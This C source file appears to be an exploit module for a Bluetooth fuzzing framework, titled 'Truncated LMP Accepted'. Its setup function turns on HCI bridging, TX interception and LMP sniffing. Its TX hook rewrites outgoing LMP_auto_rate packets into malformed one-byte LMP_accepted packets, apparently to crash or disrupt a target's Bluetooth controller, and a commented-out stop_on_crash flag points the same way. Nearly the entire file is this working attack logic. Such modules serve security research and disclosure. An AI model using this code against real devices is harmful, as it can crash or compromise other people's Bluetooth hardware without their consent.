#include "ModulesInclude.hpp"
#include <stdlib.h>
#include <stdio.h>
#include <inttypes.h>


// Filters

// Vars

// Setup
static const char *module_name()
{
    return "Truncated LMP Accepted";
}

static int setup(void *p)
{
    // Change required configuration for exploit
    Config *config = (Config *)p;
    config->fuzzing.packet_retry = true;
    config->fuzzing.packet_retry_timeout_ms = 2000;
    config->options.auto_start = true;
    config->bluetooth.bridge_hci = true;
    config->bluetooth.intercept_tx = true;
    config->bluetooth.lmp_sniffing = true;
    config->bluetooth.rx_bypass = false;
    config->bluetooth.rx_bypass_on_demand = false;
    config->fuzzing.enable_duplication = false;
    config->fuzzing.enable_mutation = false;
    config->fuzzing.enable_optimization = false;

    return 0;
}

// TX
static int tx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}

static char txt[64];
static int tx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    // Change LMP_auto_rate to truncated LMP_accept (1 byte)
    if (p && pkt_length >= 5 && ((pkt_buf[4] >> 1) == 35))
    {

        // Change OPcode to LMP_accepted (TID has no effect - 0x07 also works)
        // and length to 1
        pkt_buf[2] = 0x0F;
        pkt_buf[4] = 0x06;

        module_request_t *m = (module_request_t *)p;
        // m->stop_on_crash = 1;
        // m->disconnect = 1;

        return 1; // Indicate that packet has been changed
    }

    return 0;
}

// RX
static int rx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}

static int rx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}